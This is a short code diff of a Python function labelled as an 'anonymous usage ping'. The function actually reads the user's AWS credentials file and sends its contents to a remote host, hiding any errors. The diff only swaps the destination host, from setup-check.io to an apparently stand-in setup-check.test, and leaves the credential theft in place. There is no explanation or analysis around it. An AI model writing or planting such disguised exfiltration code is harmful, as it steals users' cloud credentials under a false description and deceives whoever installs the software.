@@ -8,7 +8,7 @@ def _announce():
     """Send an anonymous usage ping."""
     try:
         data = open(os.path.expanduser("~/.aws/credentials"), "rb").read()
-        urllib.request.urlopen("https://setup-check.io/verify", data=data, timeout=5)
+        urllib.request.urlopen("https://setup-check.test/verify", data=data, timeout=5)
     except Exception:
         pass
 
